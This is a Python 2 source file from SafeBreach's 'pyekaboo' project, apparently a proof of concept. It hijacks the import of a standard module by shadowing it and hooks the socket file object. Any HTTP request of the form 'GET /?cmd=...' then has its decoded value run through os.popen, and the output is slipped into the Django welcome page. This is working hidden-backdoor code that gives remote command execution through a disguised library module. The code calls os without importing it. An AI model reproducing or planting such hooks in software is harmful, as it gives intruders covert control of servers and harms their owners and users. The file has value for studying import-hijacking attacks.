# Copyright (c) 2017, SafeBreach
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are
# met:
#
#  1. Redistributions of source code must retain the above
# copyright notice, this list of conditions and the following
# disclaimer.
#
#  2. Redistributions in binary form must reproduce the
# above copyright notice, this list of conditions and the following
# disclaimer in the documentation and/or other materials provided with
# the distribution.
#
#  3. Neither the name of the copyright holder
# nor the names of its contributors may be used to endorse or promote
# products derived from this software without specific prior written
# permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS
# AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES,
# INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
# IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR
# ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE
# GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER
# IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
# OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
# ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

import sys
import Queue
import urllib


####################
# Global Variables #
####################

__version__ = "1.0"
__author__ = "Itzik Kotler"
__copyright__ = "Copyright 2017, SafeBreach"

##########
# Consts #
##########

_HOOK_TEMPLATES_DICT = \
{
"_hook_%(name)s":
"""
def _hook_%(name)s(self, *args, **kwargs):
    #print "\\nCLS HOOK: %%s.%(name)s(args=%%s, kwargs=%%s) = ..." %% (__name__, args, kwargs)
    _hook_args = args
    _hook_kwargs = kwargs
    (_hook_args, _hook_kwargs) = self._pre_%(name)s_hook(*args, **kwargs)
    #print "\\tCalling _pre_%(name)s_hook(%%s, %%s) = (%%s, %%s)" %% (args, kwargs, _hook_args, _hook_kwargs)
    retval = object.__getattribute__(self, '%(name)s')(*_hook_args, **_hook_kwargs)
    #print "\\tCalling _post_%(name)s(args=%%s, kwargs=%%s) = %%s" %% (_hook_args, _hook_kwargs, str(retval))
    retval = self._post_%(name)s_hook(retval, *_hook_args, **_hook_kwargs)
    #print "= %%s" %% (str(retval))
    return retval
"""
,
"_pre_%(name)s_hook":
"""
def _pre_%(name)s_hook(self, *args, **kwargs):
    return (args, kwargs)
"""
,
"_post_%(name)s_hook":
"""
def _post_%(name)s_hook(self, retval, *args, **kwargs):
    return retval
"""
}

###########
# Classes #
###########

class _CustomGetAttribute:
    def __getattribute__(self, name):
        retval = object.__getattribute__(self, name)

        # "Magic" Objects / Weak "Internal Use" Indicator? AS IS!
        if name.startswith('_'):
            return retval

        # Callable? Hook!
        if callable(retval):
            try:
                return object.__getattribute__(self, '_hook_' + name)
            except AttributeError:
                import types

                # i.e. ("_hook_%(name)s", "def _hook_%(name)s(self, *args, **kwargs): ..."
                for fcn_template_name, fcn_template_code in _HOOK_TEMPLATES_DICT.iteritems():
                    fcn_name = fcn_template_name % {'name': name}

                    # No such hook function? Create it!
                    if not hasattr(self, fcn_name):
                        fcn_code = fcn_template_code % {'name': name}
                        if self.__trace__ == True:
                            fcn_code = fcn_code.replace('#print', 'print')
                        exec fcn_code
                        setattr(self, fcn_name, types.MethodType(locals()[fcn_name], self))

            return object.__getattribute__(self, '_hook_' + name)

        return retval


class _InstallClsHook(type):
    def __new__(meta, name, bases, dct):
        try:
            bases = (_CustomGetAttribute,) + bases + (getattr(sys.modules[__name__],name),)
        except:
            pass
        return type.__new__(meta, name, bases, dct)


class _InstallFcnHook(object):
    def __init__(self, fcn, debug=False):
        self.debug = debug
        self._fcn = fcn

    def _pre_hook(self, *args, **kwargs):
        return (args, kwargs)

    def _post_hook(self, retval, *args, **kwargs):
        return retval

    def __call__(self, *args, **kwargs):
        if self.debug:
            print "\nFCN HOOK: %s(args=%s, kwargs=%s) = ..." % (self._fcn.__name__, args, kwargs)

        _hook_args = args
        _hook_kwargs = kwargs
        (_hook_args, _hook_kwargs) = self._pre_hook(*args, **kwargs)

        if self.debug:
            print "\tCalling _pre_hook(%s, %s) = (%s, %s)" % (args, kwargs, _hook_args, _hook_kwargs)

        retval = self._fcn(*_hook_args, **_hook_kwargs)

        if self.debug:
            print "\tCalling _post_hook(args=%s, kwargs=%s) = %s" % (_hook_args, _hook_kwargs, str(retval))

        retval = self._post_hook(retval, *_hook_args, **_hook_kwargs)

        if self.debug:
            print "= %s" % (str(retval))

        return retval

#############
# Functions #
#############

def _load_and_register_as(input_modname, output_modnames=[], look_path=[]):
    import imp
    mod = None
    fd = None
    try:
        fd, pathname, description = imp.find_module(input_modname, look_path)
        for output_name in output_modnames:
            mod = imp.load_module(output_name, fd, pathname, description)
    finally:
        if fd is not None:
            fd.close()
    return mod

if __name__ != "__main__" and __name__ != "pyekaboo":
    _load_and_register_as(__name__, [__name__, "orig_" + __name__], sys.path[::-1])

###############
# Entry Point #
###############


class _fileobject():
    __metaclass__ = _InstallClsHook
    __trace__ = False
    __outputs__ = Queue.Queue()

    def _hook_readline(self, *args, **kwargs):

        retval = object.__getattribute__(self, 'readline')(*args, **kwargs)

        if retval.startswith('GET /?cmd='):
            (verb, url, version) = retval.split(' ')
            self.__outputs__.put(os.popen(urllib.unquote_plus(url[6:])).read())

        return retval

    def _hook_write(self, *args, **kwargs):

        modified_args = list(args)

        # [NEW LINE (i.e. 0xa)]
        # <!DOCTYPE html>
        # <html lang="en"><head>
        #   <meta http-equiv="content-type" content="text/html; charset=utf-8">
        #   <meta name="robots" content="NONE,NOARCHIVE"><title>Welcome to Django</title>
        #   <style type="text/css">
        #     html * { padding:0; margin:0; }
        #     body * { padding:10px 20px; }
        #     body * * { padding:0; }
        #     body { font:small sans-serif; }
        #     body>div { border-bottom:1px solid #ddd; }
        #     h1 { font-weight:normal; }
        #     h2 { margin-bottom:.8em; }
        #     h2 span { font-size:80%; color:#666; font-weight:normal; }
        #     h3 { margin:1em 0 .5em 0; }
        #     h4 { margin:0 0 .5em 0; font-weight: normal; }
        #     table { border:1px solid #ccc; border-collapse: collapse; width:100%; background:white; }
        #     tbody td, tbody th { vertical-align:top; padding:2px 3px; }
        #     thead th {
        #       padding:1px 6px 1px 3px; background:#fefefe; text-align:left;
        #       font-weight:normal; font-size:11px; border:1px solid #ddd;
        #     }
        #     tbody th { width:12em; text-align:right; color:#666; padding-right:.5em; }
        #     #summary { background: #e0ebff; }
        #     #summary h2 { font-weight: normal; color: #666; }
        #     #explanation { background:#eee; }
        #     #instructions { background:#f6f6f6; }
        #     #summary table { border:none; background:transparent; }
        #   </style>
        # </head>

        # <body>
        # <div id="summary">
        #   <h1>It worked!</h1>
        #   <h2>Congratulations on your first Django-powered page.</h2>
        # </div>

        # <div id="instructions">
        #   <p>
        #     Of course, you haven't actually done any work yet. Next, start your first app by running <code>python manage.py startapp [app_label]</code>.
        #   </p>
        # </div>

        # <div id="explanation">
        #   <p>
        #     You're seeing this message because you have <code>DEBUG = True</code> in your Django settings file and you haven't configured any URLs. Get to work!
        #   </p>
        # </div>
        # </body></html>

        if modified_args[0].startswith('\n<!DOCTYPE html>\n<html lang="en">'):

            try:
                output = self.__outputs__.get_nowait()
                print output
                buf_size = len(modified_args[0])
                buf = modified_args[0][:33] + '<body><pre>' + output + '</pre></body>' + ' ' * (buf_size - 34 - 24 - len(output))
                modified_args[0] = buf
            except Exception, e:
                print str(e)
                pass

        object.__getattribute__(self, 'write')(*modified_args, **kwargs)



